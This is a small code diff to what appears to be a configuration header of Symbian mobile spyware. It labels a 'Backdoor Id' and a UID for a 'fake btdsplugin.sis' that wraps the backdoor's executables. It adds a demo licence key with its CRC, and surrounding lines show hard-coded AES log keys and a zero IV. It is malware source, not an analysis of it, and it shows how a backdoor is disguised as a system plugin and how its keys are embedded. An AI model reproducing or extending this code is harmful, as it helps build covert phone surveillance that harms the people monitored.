@@ -22,6 +22,8 @@
 //_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
 _LIT8(KVERSION,"\x02\xd1\xde\x77");		//2011091202 7.4 bugfix1
 
+// KEY Section
+
 _LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
 
 // Backdoor Id
@@ -99,7 +101,16 @@ _LIT8(KAES_LOGS_KEY, "a875373040a90f4a8d8dfc00ef4cc645");  //RCS_0000000005  //N
 _LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
 #endif
 
-// UID section
+//Demo key
+#ifdef _DEBUG
+_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmJO");
+#else
+_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmLE");
+#endif
+//CCITT CRC (16 bits, polynomial 0x1021 and initial value 0xffff) of "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+const TUint16 KCrcDemoKey=0x2e2; 
+
+// UID Section
 
 #ifdef _DEBUG
 _LIT8(KUidBackdoor,"0x20024d7a");   // fake btdsplugin.sis (encapsulates all executables below)
